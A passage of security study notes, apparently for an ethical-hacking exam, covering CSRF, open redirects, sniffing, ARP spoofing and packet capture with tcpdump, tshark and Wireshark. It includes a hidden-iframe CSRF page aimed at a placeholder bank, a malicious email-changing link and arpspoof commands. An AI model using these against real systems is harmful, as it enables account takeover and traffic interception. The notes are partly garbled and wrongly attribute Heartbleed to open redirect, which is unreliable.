     currentaccountkey=encryptedec117d8fd0eb30ab690c051f73f4be34& TransferView=TRUE
Accept-Language: en-US
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
Accept-Encoding: gzip, deflate Host: www.somebank.com Connection: Keep-Alive
Cookie: JSESSIONID={value}; BrowserNavData=true|-1; somebank.com.uniqueId={value}; somebank.com.machine.session={value}; SSID={value}; SSRT={value}; SSPV={value}; UASK=39bwcDrir8moz_f8p6JftTH9hWt6EEhWpqSct35zzsfv86wySvpnVPA; somebank.com.machine.ident={value}; VisitorId=AIBJLR221KWGQYKERWP5C20120205; grpId=7; MemberGlobalSession=2:1000:5ZJBAM5213M3C515PLAR; TDO_RANDOM_COOKIE=97890180120120205153123; dcenv=1; LtpaToken2={value}=; LtpaToken={value}
The user then receives an email from what he believes to be his best friend asking him to check out his items on an auction site at the following URL:
Htt p://www.somecoolacutionsite.com/sampleauction.html.
Unknown to the user, the email was not from his friend, and when he clicks on the URL, the auction site does not contain any auctions. However, what the “auction” site did was use CSRF to perform an action on behalf of the user to the banking site the user is still logged into.
Here is the HTML code from the “auction” site:
<html>
   <head></head> <body>
Welcome to the “auction” portal. Buyer beware!
<Iframe src=”https://www.somebank.com/inet/sb_bank/BkAccounts ? target=AccountSummary&currentaccountkey=encryptedec117d8fd0eb30ab690c05 1f73f4be34&TransferView=TRUE” id=”xsrf” style=”width:0px; height:0px; border:0px”></iframe>
</body> </html>
And the malicious Request information is as follows:
HTTP/1.0
Accept: text/html, application/xhtml+xml, */*
Referer: http://www.malicioussite.com/sampleauction.html Accept-Language: en-US
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
Accept-Encoding: gzip, deflate
Host: www.somebank.com
Connection: Keep-Alive
Cookie: JSESSIONID={value}; SSLB=1; SSSC=1.G5704896267906605088.7| 10.607; BrowserNavData=true|-1; somebank.com.uniqueId=MTIgISEgITQwJjM2MDM3OTk0; somebank.com.machine.session=9DUvMKuboaOuRCYdLlct6Nm; UASK=39bwcDrir8moz_f8p6JftTH9hWt6EEhWpqSct35zzsfv86wySvpnVPA; MemberGlobalSession={value}; TDO_RANDOM_COOKIE={value}; dcenv=1; LtpaToken2={value}=; LtpaToken={value}
Notice something different between the two? The Referrer between the two Requests is different – also, all of the session and unique ID information                       were the same. We will address these areas a bit more in a later section.
Vectors for CSRF Attack
    Cross- Domain Request Type
      <Iframe>
<img src=...>
<script src=... >
<FORM ....>
Ajax
Explanation
allows for the cross-domain generation of content within the current domain’s session.
Image tags allow pulling the src image from other domains. Since the browser does not validate the request is an actual image, any valid URL pointing to any location and resource can be placed in the src attribute.
Script tags allow pulling the src script file from other domains. Since the browser does not validate the request is an actual script, any valid URL pointing to any location and resource can be placed in the src attribute.
<iframe>, <img>, and <script> are considered GET request methods.
POST methods submit a <FORM> with input variables with a name and value attribute, to a URL specified in the action attribute of <FORM>. The <FORM> is then submitted when the user lands on the malicious page.
Taking advantage of the <FORM> POST method, an Ajax-based site can be sent information in an XML stream, as an example.*
                        JSON
Many applications are developed using a JSON stream to exchange information between clients and servers. Because of the way a JSON string is formatted, it is possible to once again use the <FORM> request type to carefully craft a JSON type string and send the action URL. JSON strings take the form of {“field”: “value”, ...}. An input field in a <FORM> can be used to by placing the {“field”: “value”,...} pair as the name attribute value and setting value=’no’.*
*<FORM> is not the only method to use. It is just easier to explain the attack using <FORM>. Also, using <FORM>, <img>, and <script> will allow a read-only access to the data. Information access is possible using a combination of <script> and Ajax. However, this exercise is left to the reader.
CSRF Protection Mechanisms
significantly reduce the risk of exposure, as well as the cost to implement.
  Mitigation
  Phase
    Design
Remediation Recommendation
- Use a unique identifier to associate a user request with a specific action. The identifier should be recreated for every request and action. The identifier is considered invalid if it arrived with a request without the associated action. An example is the use of a token that is attached to each request/action.
- checking the HTTP Referer header can also be used to validate an incoming request was actually one from an allowed or authorized domain.        Implem entation
- The user must be prompted to confirm an action every time for actions concerning potentially sensitive data. The confirmation along with the design approach of uniquely identifying requests and actions will thwart phishing and related attacks.
- All requests must be checked for the appropriate authentication token as well as authorization in the current session context.
- Check the Referral and make sure it is generated from the target page residing in the same domain.
- For XML and JSON verify and validate the Content Type.
Final Thoughts
CSRF is also difficult to detect with static analysis products, and only a handful of dynamic scanners can detect the possibility of a CSRF lurking within.
The most effective strategy for detecting CSRF is to manually test the application by creating a page with one of the Cross-Domain Request Types and point the src of one of those types to your site.
The following guidelines provide the ultimate protection for any web application:
1. Input Validation – do not trust any data from any source. Validate the information for content, length, format, and other factors prior to use.
2. Parameterized statements – avoid dynamic SQL statements. Always
bind data to parameters that clearly identify the data type of the bind
value.
3. Business rule validation – always apply business validation to input.
Business validations include length, type, and expected value.
4. Least privilege – only allow read only access to the data as a general rule, and other access as an exception. If a form within an application
simply views the data, only call the database with a read-only database user. If adding or modifying data, call the database with a modify and add database user. ▪


## 5. Logging – always log access to data, modification of data, and, if necessary, access to the data.
6. As a general rule, do not allow deletion – mark record for deletion and create a separate process to delete.
7. Threat modeling – always threat model an application to understand access points to the database, input points to the application, and what boundaries and layers are involved through the data flow of the application.
8. Error handling – do not throw detailed error messages to the screen for viewing by the user. The detailed information that is included in an error message is invaluable to an attacker providing valuable clues on how to modify the attack to allow the attack to execute without error.
9. Trust but verify – verify and validate any requests, data, and calls into your application, even if you trust the source, because the source itself could have been compromised.
The next installment of the series will be a Part II discussion of Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) and how the combination of the two can truly be a lethal combination for any organization with a web presence.
Cross-Site Request Forgery 伪造 (XSRF) CSRF 跨站请求伪造
Known as session riding, one-click attack
CSRF is an attack that requires two elements:
  - 1) a web application that performs actions
  - 2) an authenticated user.
forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. 挟制用户在当前已登录的Web应用程序上执行非本意的操作 的攻击方法
tricks the victim into submitting a malicious request, to perform an undesired function
     ▪


## - 完成一些违背用户意愿的请求(如恶意发帖，删帖，改 密码，发邮件等)。
  - For most sites, browser requests automatically include any credentials associated with the site, such as the user’s session cookie, IP address, Windows domain credentials, and so forth.
  - Therefore, if the user is currently authenticated to the site, the site will have no way to distinguish between the forged request sent by the victim and a legitimate request sent by the victim.
  - 冒充用户发起请求(不知情 )tricks a user into performing an action on a web site.
  - If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth.
  - If the victim is an administrative account, CSRF can compromise the entire web application.
involves unauthorized commands coming from a trusted user of website
The attacker creates a specially crafted HTML link and the user performs the action without realizing it.
If the web site support any action via an HTML link, and attack is possible.
Web sites typically won’t allow these actions without users
first logging on.
  - But, if users have logged on before
  - Authentication information is stored on their system
either in a cookie or in the web browser’s cache.
  - Some web sites automatically use third info to log
   ▪


## users on.
In some case, the XSRF attack allows the attacker to access the user;s password.
EXAM TIP A session fixation attack is somewhat similar to CSRF. The attacker logs in to a legitimate site and pulls a session ID, then sends an e-mail with a link containing the fix session ID. When the user clicks it and logs into the same legitimate site, the hacker can now log in and run with the user’s credentials.
whole thing in action.
  CSRF attacks can be mitigated by configuring a web server to send random challenge tokens.
If every user request includes the challenge token, it
becomes easy to spot illegitimate requests not initiated by the user.
 ▪


## Protection:
disable the running of scripts (and browser profiles).
For cross-site scripting, primary burden of protection: web site developers.
Developers need to be aware of XSRF attacks and the
different methods used to protect against them.
  - use dual authentication and force the user to manually
enter credentials prior to performing actions.
  - expire the cookie after a short period, such as after 10
minutes, preventing automatic logon for the user.
Example:
  - chatting through Facebook.
  - sends a link of funny video.
  - clicks the link, but it actually brings up Evan’s bank
account information in another browser tab, takes a screenshot of it, closes the tab, and sends the information to Spencer.
  - The reason the attack is possible is because Evan is a trusted user with his own bank.
  - In order for it to work, Evan would need to have recently accessed that website and have a cookie not yet expire.
Example:
  - how HTML links create action
  - consider this HTML link: http://www.google.com/
search?q=Success. If users click this link, it works just as if the user browsed to Google and entered Success as a search term. The ?q=Success part of the query causes the action.
         - Many web sites use the same type of HTML queries to perform actions.
  - Example
  - a web site that supports user profiles.
  - If users change profile information, they log on, make
the change, and click a button.
  - The web site may use a link like this to perform the
action:
http://getcertifiedgetahead.com/edit? action=set&key=email&value=you@home.com.
  - Attackers use this knowledge to create a malicious link.
  - example, the following link could change the email
address in the user profile, redirecting the user’s email
to the attacker:
http://getcertifiedgetahead.com/edit? action=set&key=email&value=hacker@hackersrs.com.
Many programming languages support XSRF tokens. Example
Python and Django, two popular web development languages, require the use of an XSRF token in any page that includes a form, these languages call them CSRF tokens.
This token: a large random number generated each time the form is displayed.
When a user submits the form, the web page includes the token along with other form data.
web application then verifies that the token in the HTML request is the same as the token included in the web form.
The HTML request might look something like this:
           ▪


## getcertifiedgetahead.com/edit? action=set&key=email&value=you@home.com&token=1357 924
The token is typically much longer.
If the website receives a query with an incorrect error, it typically
raises a 403 Forbidden error.
Attackers can’t guess the token, so they can’t craft malicious
links that will work against the site.
Command injection.
injects system commands into computer program variables such that they are executed on the
web server.
Open redirect
a security flaw in an app or a web page that causes it to
fail to properly authenticate URLs.
When apps and web pages have requests for URLs, they are supposed to verify that those URLs are
 ▪


## part of the intended page’s domain.
Open redirect is a failure in that process that
makes it possible for attackers to steer users to malicious third-party websites.
Sites or apps that fail to authenticate URLs can become a vector for malicious redirects to convincing
fake sites for identity theft or sites that install malware. Normally, redirection is a technique for shifting
users to a different web page than the URL they requested. Webmasters use redirection for valid reasons, such as dealing with resources that are no longer available or have been moved to a different location. Web users often encounter redirection when they visit the Web site of a company whose name has been changed or which has been acquired by another company.
The Heartbleed vulnerability, originally reported
to be enabled by convert redirects, was eventually discovered to be the result of the less serious -- but still irresponsible -- enabling of open redirect.
Sniffing
- Definition of Sniffing:
  - A program or device that captures vital information from the network
traffic specific to a particular network.
  - Sniffing is a data interception technology
  - The objective of sniffing is to steal:
  - Passwords (from email, the web, SMB, ftp, SQL, or telnet). 1,887

▪
  - Email text.
  - Files in transfer (email files, ftp files, or SMB).
  - There are other goals for sniffing like network maintenance.
  - a packet sniffer is: a piece of software that grabs all of the traffic flowing into and out of a computer attached to a network.
- Types of Sniffing:
  - Passive sniffing: Sniffing through a Hub.
  - Active sniffing: Sniffing through a Switch.
  - Techniques for active sniffing:
  - ARP (Address Resolution protocol) spoofing.
  - MAC flooding.
偷聽從第二層開始，愈底層愈好。 Sniffing的關鍵不是在於偷聽(wiretap)，而是搶到中間人的好位置。
Sniffing手法:
Mac Flooding:發送大量偽造的MAC位址給switch使其表溢出，讓 switch變成廣播模式。
Arp Spoofing:送出假的ARP回應封包給目標主機，讓對方的流量送 至攻擊者主機。
DHCP Attack:先跟DHCP Server拿光IP位址，並取得子網域遮罩、預 設閘道，以假冒DHCP Server。
Proxy Server DNS Poisoning:感染目標主機使其走攻擊者架的 Proxy。
DNS Cache Poisoning:送偽造的DNS封包給DNS Server，使其記錄 下錯誤的Domain Name與IP的對應資料快取。
capturing packets, gathering all messages that pass by the network interface (grabbing them at the Data Link layer), passing all the messages up to an application to displaying the messages captured.
it's really frames that are being grabbed since the data is being grabbed at the Data Link layer with the layer 2 headers intact.
The protocol data unit (PDU) at layer 2: frame.
The PDU at layer 3 is a packet.
     ▪


## There is a lot of software that can be used to capture packets across varied platforms.
Tcpdump, late 1980s. Windows, you can get a port of tcpdump called windump
tcpdump -nnvvS 'tcp[13] & 16!=0' dst 162.241.216.11 and dst port 80
tcpdump -nnvXSs 0 -c1 icmp
Tshark, command- line program, comes with the Wireshark package. It also has the advantage of giving you the capability of printing only the fields you indicate.
tshark -f 'port 443'
Wireshark, not only packet capture but also packet analysis.
analyze packet captures, Wireshark best
knows about protocols, does protocol decoding and can identify issues with protocols
provide expert information that you can look at all at once from the Analyze menu.
Statistics menu, provides a number of different ways to look at the data. protocol hierarchy, showing how the protocols break down in the packet capture. You can also look at the packet capture from the perspective of endpoints.
statistics views, you can see packet and byte counts.
to get packets to the device where you are tr ying to capture them. mirror ports on a switch: port spanning, Cisco calls SPAN.
You may not have access to the switch, but can also perform spoofing attacks, such as ARP spoofing.
ARP spoofing: system sends gratuitous ARP responses, cached on other systems
also use ARP spoofing as a starting point to do DNS spoofing
also use ARP spoofing to redirect web requests to the sslstrip plug-in.
arpspoof -i eth0 -c both gatewayIP arpspoof -i eth0 -t victimHostIP gatewayIP
     DNS spoofing is also a possible way to redirect traffic to an attacker. This may be done by interceptin g DNS requests and responding to them faster than the legitimate DNS server. In the case of DNS, first to answer wins, and sometimes DNS clients will accept answers even from IP addresses that don't originate the request because DNS servers may sometimes respond on a different IP address than the one the response came in on.
Detect Sniffing
- check which machines are running in promiscuous mode.
- Run ARPWATCH
  - notice if the MAC address of certain machines has changed
  - (Example: router’s MAC address).
- Run network tools like HP OpenView and IBM Tivoli network health
check tools
  - monitor the network for strange packets.
- Ping method:
  - This method relies on a problem in the target machine's kernel
  - construct an ICMP echo request with the IP address of the
machine suspected of hosting a sniffer but with a deliberately
mismatched MAC address.
  - We send an ICMP echo packet to the target with the correct
destination IP address, but a bogus destination hardware
address.
  - Most systems will disregard this packet since its hardware
address information is incorrect.
  - But in some Linux, NetBSD and NT systems, since the NIC is in
promiscuous mode, the sniffer will grab this packet off the
network as a legitimate packet and respond accordingly.
  - If the target in question replies to our request, we know it is in
promiscuous mode.
  - Clever attackers are of course aware of this and can update their sniffers to filter out such packets as the NIC itself would have had it not been in promiscuous mode.
 - ARP method:
  - send out an ARP request to our target with all valid information
except a bogus destination hardware address.
  - machine not in promiscuous mode would not see the packet,
since it wasn't destined to them, it wouldn't reply.
  - If machine is in promiscuous Internet Security Lab.1 8 mode,
the ARP request would be seen and the kernel would process it
and reply.
  - By the machine replying, we know it is in promiscuous mode.
- Latency method:
  - ping the target and note the round trip time (RTT), from there.
  - create hundreds of fake TCP connections on our network
segment at a lightning rate.
  - expect the sniffer to be processing those packets at a rate
where the target machine's network latency will increase.
  - then ping the target once again, and compare the RTT this time
to the first time.
  - After a series of tests and averages, we can conclude whether
or not a sniffer is indeed running on the target.
- Using IDS (Intrusion detection system).
- Tools
  - Antisniff: detect machines on the network that are running in
promiscuous mode.
  - ArpWatch: monitors Ethernet activity, keeps a database of
Ethernet/IP address pairings.
  - In Small Network:
  - Use of static IP addresses and static ARP tables
  - prevents hackers from adding spoofed ARP entries for
machines in the network.
  - In Large Networks:
  - Network switch Port Security features should be enabled.
  - Use of ArpWatch to monitor Ethernet activity.
Countermeasures:
 1. Restriction of physical access to network media ensures that a packet sniffer cannot be installed.
2. The best way to be secured against sniffing is to use Encryption.
  - not prevent but ensure sniffer reads is not important.
3. ARP Spoofing <- permanently adding the MAC address of the gateway to the ARP cache.
4. change the network to SSH.
Sniffing and Evasion
oftentimes, they went down there to take or place personal calls on their cell phones. I know I was educated in Alabama, but I just assumed everyone knew sound travels.
Essentials
Most people consider eavesdropping to be a little on the rude side. pen tester, have to get over your societal norms and become an ace at virtual eavesdropping.
Sniffing (wiretapping by law enforcement types)
- capturing packets as they pass on a wire, airwaves, to review
information
- could simpe or high value as a password or other authentication code.
  - to capture the data, grab authentication/authorization traffic, personally identifiable information (PII), personal health information (PHI)....
Sniffer: the tool you’ll use to accomplish this, and a host of different ones are available.
Network Knowledge for Sniffing
review how network devices listen to the wire (or other media) and how all these topics tie together.
- network devices don’t just start babbling at each other like we humans do.
- They’re organized and civilized in their efforts to communicate with each other.
- how addressing works and what the protocols are doing at each layer.
The process of sniffing comes down to a few items of great importance:
- what state the network interface card (NIC) is in,
- what access medium you are connected to,
- what tool you’re running.
- Because a sniffer is basically an application that pulls all frames off a medium for your perusal, and because you already know the full communications process
EXAM TIP
- IPv4 loopback address (denoting the software loopback of your own machine) is 127.0.0.1,
- the MAC address of broadcast messages is FF:FF:FF:FF:FF:FF. 1. NIC
NIC: piece of electronic genius works by listening to a medium (wire or airwaves / wireless).
- If the NIC is on an electric wire (assume in a standard Ethernet network), it reacts when electricity charges the wire and then begins reading the bits coming in.
- If the bits come in the form of a frame, it looks at the destination address.
- NICs are programmed to only forward frames to operating system if that address matches:
  - its own MAC address,
  - the broadcast address for the subnet,
  - the MAC address of broadcast messages is FF:FF:FF:FF:FF:FF.
  - or a multicast address it is aware of,
  - it will pull the frame from the wire and let the operating
system begin working on it.
- NIC (under the influence and control of OS and its associated drivers) will see anything passing by
  - normally won’t pull in any frame not addressed to it.
  - only pulls in and examines things it recognizes as addressed
to the host.
- In order to force the NIC to forward all messages up to the operating system, the NIC card has to be put into promiscuous mode.
  - gets the NIC to forward all messages up.
A sniffer needs your card to run in promiscuous mode.
- regardless of address, if the frame is passing on the wire, the NIC will grab it and pull it in for a look.
- NICs are designed to pay attention only to unicast messages addressed appropriately, multicast messages, or broadcast messages,
- you need something that forces the NIC to behave promiscuously for your sniffer.
- on Windows machine NICs.
  - the de facto driver/library choice is WinPcap
  - an driver that allows the operating system to provide low- level network access and is used by a lot of sniffers
- On Linux, libpcap.
2. what wire, or medium, you have access to.
Ethernet uns with multiple systems sharing a wire and negotiating time to talk based on Carrier Sense Multiple Access/Collision Detection (CSMA/CD).
- In short, anyone can talk anytime they want, so long as the wire is quiet.
- If two decide to talk at the same time, a collision occurs, they back off, and everyone goes at it again.
- As long as your system is within the same collision domain, right out of the box and without you changing a thing, your NIC will see every message intended for anyone else in the domain.
- This doesn’t mean your NIC will act on these messages.
  - Again, it will only act on unicast messages addressed for the host, and broadcast/multicast messages for the subnet.
  - NIC usually only forwards the ones intended for you and ignores the rest.
Collision domains are composed of all the machines sharing any given transport medium.
- all connected to the same wire, only one of us can talk at a time, if two try it simultaneously, the voltage increases, and the messages
 ▪


## will get all garbled up.
- Because we’re all connected to the same wire, I don’t have to guess when anyone else is sending a message; I’m getting shocked every time anyone sends anything. I don’t read them all, because they’re not addressed for me, but I know they’re being sent.
- Jane opened up a line of communication and listened while Bob told that ridiculous joke. Bill, who decided he’d listen to everyone’s conversation, didn’t have to do a thing to enjoy the joke message, even though it wasn’t intended for him.
Hub: All systems connected to a hub share the same collision domain; every system on the hub can hear every other system on the hub sends or receives.
Switches: split collision domains, each system connected to the switch resides in its own little collision domain, the switch will send frames down a wire for a given computer only if they’re intended for the recipient.
If you’re connected to a switch and you receive only those messages intended for your own NIC, what good is it to sniff? This is an excellent question and a good reminder that it’s important to know what you actually have access to, media-wise. We’ll revisit this in just a moment when we start discussing active sniffing.
Protocols Susceptible to Sniffing
Once start to look at all those packets pulling in, start asking yourself which ones are more important than others. this is where knowledge of how protocols work on a network comes into play.
There are some important protocols in the upper layers for you to pay attention to as an ethical hacker, mainly because of their simplicity.
 ▪


## Application layer protocol, normally relies on other protocols for almost everything else except its sole primary purpose.
Application layer protocols to pay attention to:
Simple Mail Transport Protocol (SMTP).
  - was designed to do one thing: carry an e-mail message.
  - It doesn’t know anything about IP addressing or encryption, or
how big the network pipe is;
  - its only concern is packaging ASCII characters together to be
given to a recipient.
  - Because it was written to carry nothing but ASCII
  - there is virtually no security built into the protocol at all.   - everything sent via SMTP, no encryption added at
another layer, is clear text, can be easily read by
someone sniffing the wire.
  - Now, SMTP is on version 3 now (SMTPv3), so not all SMTP
packets will provide the detail you’re looking for, but I’m sure you catch the drift.
FTP
  - although FTP requires a user ID and password to access the server (usually), the information is passed in clear text over the wire.
TFTP passes everything in clear text, and you can pull keystrokes from a sniffed telnet session (user name and password anyone?).
Telnet and Rlogin: Keystrokes including user names and passwords. HTTP: Data sent in clear text.
SMTP: Passwords and data sent in clear text.
NNTP: Passwords and data sent in clear text.
POP: Passwords and data sent in clear text. FTP: Passwords and data sent in clear text. IMAP: Passwords and data sent in clear text.
SNMPv1 and NNTP send their passwords and data over clear text, as does IMAP and POP3. And HTTP? Don’t get me started, what with all the data that one sends in the clear.
         ▪


##  Several Application layer protocols have information readily available to captured traffic, just need to learn where to look for it.
Sometimes data owners will use an insecure application protocol to transport information that should be kept secret.
Sniffing the wire, these clear-text messages go across will display all that for you.
hardware protocol analyzers
neat little boxes that do a whole lot of data sniffing and analyzing for you, automatically.
Companies such as Fluke, RADCOM, and Keysight all make versions.
protocols like the ones mentioned send passwords in the clear should avoid using them.
Protocols at the Transport and Network layers can also provide relevant data.
TCP and UDP work in the Transport layer and provide the port
numbers that both sides of a data exchange are using.
  - TCP also adds sequence numbers, which will come into play
later during session hijacking.
IP is the protocol working at the Network layer, and there is a load of
information you can glean just from the packets themselves.   - An IP packet header contains:
  - source and destination IP addresses.
  - the quality of service for the packet (Type of Service field)
  - and information on fragmentation of packets along the
way (Identification and Fragment Offset fields), which prove useful in crafting your own fragmented packets later.
       ▪


##  ARP Address Resolution protocol
the Data Link layer: a huge area of focus for the sniffing portion (your success in sniffing).
Frames are built in the Data Link layer, where all your local addressing happens.
ARP’s entire purpose in life is to resolve IP addresses to machine (MAC) addresses.
each IP packet provides the network address (needed to route the packet across different networks to its final destination),
the frame must have a MAC address of a system inside its own subnet to deliver the message.
So as the frame is being built inside the sending machine,
  - the system sends an ARP_REQUEST to find out what MAC address inside the subnet can process the message.
  - Basically it asks the entire subnet, via a broadcasted message
  - If a machine on the local subnet has that exact IP, it respond
with ARP_REPLY directly to the sender with its MAC address.
  - The frame can then be built and the message sent.
NOTE
The MAC address that is burned onto a NIC is actually made of two sections.
     ▪


##   - The first half: 3 bytes (24 bits), organizational unique identifier: used to identify the card manufacturer.
  - The second half: a unique number burned in at manufacturing to ensure no two cards on any given subnet will not have the same address.
Sometimes the message is not intended for someone in your network segment.
Maybe it’s a packet asking for a web page, an e-mail being sent to a
server somewhere up the Net, or a packet intended to start another
yelling contest on Facebook.
if the IP address of the packet being sent is not inside the same subnet
the route table on your host already knows the packet should be
sent to the default gateway (local router port).
  - If it doesn’t happen to remember the default gateway’s MAC
address, it’ll send out a quick ARP request to pull it.
Once the packet is properly configured and delivered to the default
gateway, the router will open it, look in the route table, and build a new frame for the next subnet along the route path.
As that frame is being built, it will again send another ARP request.
This continues on each subnet until the packet finds its true destination.
ARP protocol retains a cache on machines as it works
To see this in action, use the ping, arp, and netsh commands on
your Windows machine.
  - arp –a: display your current ARP cache—you can see all the
IP-to-MAC mappings your system knows about.
  - enter arp –d * / netsh interface ip delete arpcache.
  - Try arp –a again, your cache cleared.
  - Refill it on the fly by pinging anything on your network.
  - Example
  - pinged a laptop with an address of 192.168.0.3.
  - It responded, and my ARP cache has a new entry
     ▪


##  ⁃
couple of other relevant notes on ARP
First, the protocol works on a broadcast basis. requests and replies are broadcast to every machine on the network.
Second, the cache is dynamic—that is, the information in it doesn’t stay there forever, gets an updated ARP message, it will overwrite
the cache with the new information. how does it help a hacker
A system on your subnet will build frames and send them out with physical address entries based on its ARP cache.
If you change the ARP cache on Machine A and alter the cached
MAC address of Machine B to your system’s MAC,
  - you would receive all communication Machine A intended to
send to Machine B.
Suppose you changed the ARP entry for the default gateway on all
     ▪


## systems in your subnet to your own machine.
  - Now you’re getting all messages everyone was trying to send
out of the local network, often the Internet.
Attackers can do this by sending something called a gratuitous ARP.
a special packet that updates the ARP cache of other systems before they even ask for it, before they send an ARP_REQUEST.
Its original intent when created was to allow updates for outdated
information, which helps with things like IP conflicts, clustering, and
all sorts of legitimate issues.
NOTE It is true that ARP is cached, but it’s also true that the cache is temporary. If an attacker has persistent access, they can simply wait itout.
Packet Capture
the process of acquiring network traffic that is addressed to systems other than your own.
Each layer of the Open Systems Interconnection (OSI) model has a different name for the protocol data unit (POU).
packet capturing are capturing frames at layer 2, include the layer 2 header with MAC addresses
though, packet is the POU for layer 3, IP layer. At layer 4, segment
Once the operating system, the networking stack in the operating system, has the frames, they can be intercepted by a piece of software.
Once the software has the message, packet capturing software will
parse the message, extracting information out of each protocol header.
  - command-line program, may display information out of the different headers.
  - graphical user interface (GUI), display the header data and the payload data.
Headers are the fields that are specific to the protocol. 1,903

▪
 provide details specific to the protocol-instructions to the protocol on how to behave.
payload.
The data being carried from one endpoint to another
may be broken up between multiple packets and certainly multiple
frames.
Fragmentation may be forced by the maximum transmission unit
(MTU) at layer 2 (the frame layer).
  - GUI-based program: easier to analyze packets
  - program like Wireshark: easier to review all the details on the
command line.
tshark
- The program Wireshark, includes the program tshark
- can also be used to capture packets.
- the program running without any parameters.
- tshark tells us that running the program as root could be dangerous.
  - cases of packet capture programs being affected by vulnerabilities where crafted packets could cause arbitrary code to be run.
  - an attacker could cause tshark to be compromised to run code provided by the attacker.
  - looks like the output from tcpdump. But there is only so much data displayed to someone capturing packets.
  - area in which tshark plain outshines tcpdump, a principal reason for using tshark over tcpdump.
   ▪


##   - select the individual fields you wanted to display.
  - printing the frame number, the IP addresses, the IP type of
service field, and the IP time to live field.
tcpdump
- written in the late 1980s
- tool available on most Linux distributions and the different Berkeley
Software Distribution (BSD) distributions.
- a command-line program
- show you what is happening on the network, to capture traffic and store that traffic in a file that can be opened later on.
- output shows mostly essential header information about each packet that has been captured.
- notice that all the layer 2 information has been removed. All you see in the output is the layer 3 information, along with a little layer 4.
  - also helpfully indicated some of the details of the Application layer traffic. (DNS requests, pointer (PTR) record /reverse lookup...)
Wireshark
a GUI-based packet capture program. comes with some command-line programs. advantages of Wireshark:
   ▪


##   - view the packets easily,
  - moving around the complete capture.
  - Unlike with tcpdump and tshark, we see the entire network stack in Wireshark, which technically makes what we have captured frames rather than packets.
  - easily scroll through the list of all frames captured.
  - shows a list of frames from a capture session.
  - Similar to tcpdump, we get what is essentially a summary of each frame.
  The columns: confgurable,
  - the frame number, relative time from the start of the capture, addresses, protocol, frame length, info column.
The information we get is a summary of each frame.
  - slightly similar to what we had from tcpdump, where there was a short summary.
  - Wireshark provides more details in the summary.
  - This is all information Wireshark can infer from the
 ▪


## packets and the communications streams.
Wireshark give list of frames (who was communicating
with what) and full protocol decodes.
  Wireshark knows how to decode almost any protocol
Figure 9.2 is a simple decode for two common protocols, IP and TCP.
Every feld is broken out in the decode, providing name of the feld, the value, the meaning.
For example
  - just look at the byte that contains the IP version and the header length
   ▪


##   - you would see 0x45.
  - This is the byte value, but the byte contains two
separate pieces of data in the two nibbles (4-byte values).
  - The frst is the version, which is 4.
  - The second is the header length 5, and if you didn’t know the IP protocol very well, you might think the length was 5.
  - Wireshark knows that you take the value 5 and multiply it by 4 because the value in that feld actually means the number of 32-bit (4 bytes) double words. As a result, Wireshark will show you that the header length is 20
Wireshark also knows loads of other protocols. help understand encrypted communications
  - the different frames are used to set up the encryption for a TLS session.
  - Open the protocol in the decode pane
  - What you can see is the version of TLS that is being
used as well as the specifc message that is being sent.
  - You know this based on the header information because the entire message isn’t yet being encrypted.
 ▪


##  Encryption is always a problem for packet captures.
Encryption: only the sender and the recipient can read the message.
Session keys, used in TLS-encrypted web messages,
are derived at the time of the session. done by using the certificates, which include public and private keys. These keys are used to share information while the symmetric key is being derived.
To decrypt any information, you would need the
session key, which means you would need to have certificate information so you could sit in the middle of the conversation, allowing to get the key.
may regularly see SSL/TLS referred to for encryption.
  - SSL (Secure Sockets Layer) has been deprecated, no longer in use
  - Many browsers won't even allow SSL-based connections.
  - now is TLS, doesn't make sense to keep referring to 1,909

▪
SSL.
Wireshark does have the ability to take RSA keys to decrypt messages that have been T LS-encrypted.
Add your RSA keys: allow you to decrypt TLS messages.
can also enter pre-shared keys: password both parties already know.
   Wireshark can open any file that has been written by tcpdump or tshark.
- it can also save its own captures.
- To create a capture from Wireshark, there are multiple avenues you could take.
  - start up Wireshark > home screen > click the shark > to start up a capture on the default, or primary, interface.
 ⁃
  - To capture non-default interface: just select one of the interfaces in the list > double-clicking > start the capture.
  - the mini graph: shows interfaces traffic and amount of traffic
  - Filtering: > "Capture ...Using This Filter." restrict what Wireshark
captures.
  - valid filter syntax entered, the box turns green.
  - until you have valid filter syntax, the box will be red. ▪


##  ⁃
Berkeley Packet Filter (BPF)
“伯克利包过滤”语法。使用BPF过滤规则，你可以确定该获取和检 查哪些流量，忽略哪些流量。BPF让你能够通过比较第2、3、4层 协议中各个数据字段值的方法对流量进行过滤。BPF中内置了一些 “基元”来指代一些常用的协议字段。可以用“host”、"prot"之类的基 元写出非常简洁的BPF过滤规则，也可以检测位于指定偏移量上的 字段(甚至可以是一个位)的值。BPF过滤器也可以由详尽的条件 链和嵌套的逻辑“与”、“或”操作组成。
an interface to the Data Link layer of a system. across many systems and applications, including tcpdump, tshark, and Wireshark.
Writing BPF consists of a number of primitives like host, ether, net, and proto.
You can use modifiers like src or dst with each of these primitives. could filter based on src host or dst host,
  - examples.
  - filter based on 1Pv4 or 1Pv6 by using the modifiers ip and i p6.
 ▪


##   - When you append a filter to a tcpdump command line, tcpdump capture and display only packets that pass through the filter.
 ⁃
  - When you are connected to a system over SSH and you run a packet capture, the most packets would be SSH packets.
  - get lost in the SSH traffic .
  - In order to capture something useful and not all SSH
packets, run tcpdump not port 22.
Example
capture TCP packets that came from or to the host 192.168.86.1.
for clarity: use parentheses to isolate one of the parameters. backslashes are used to make sure the Linux shell doesn't try to
interpret them, and they are passed as parentheses to tcpdump.
 ▪


##  Keep in mind that when you are using BPF on the command line with tcpdump, you are using a capture filter. This means that you won't see anything that doesn't pass the filter. If you are writing your capture to a file, you won't have anythin g that doesn't pass the filter. If you are expecting to perform analysis on th e capt ured file later on, you should make sure you won't need those packets later. Think carefully about the filt ers you use before applying them to capt ure.
Packet Analysis
Wireshark really excels and help a lot really understands protocols:
  - can decode the protocol, tell places where may be protocol violations.
  - There are a number of other places where Wireshark can make reading through a packet capture significantly easier.
good at determining information that isn't directly provided. 1,914

▪
  - will color frames where it identifies problems in the frame list based on rule sets.
  - These rule sets may be changed and added to.
  - The default rules color frames with errors: black backgrounds
with red text.
square brackets []: data provided by Wireshark that it has calculated
or inferred from the messages it has received. [info]
  - example,
  - Figure 9.7 shows the details of a frame where were errors.
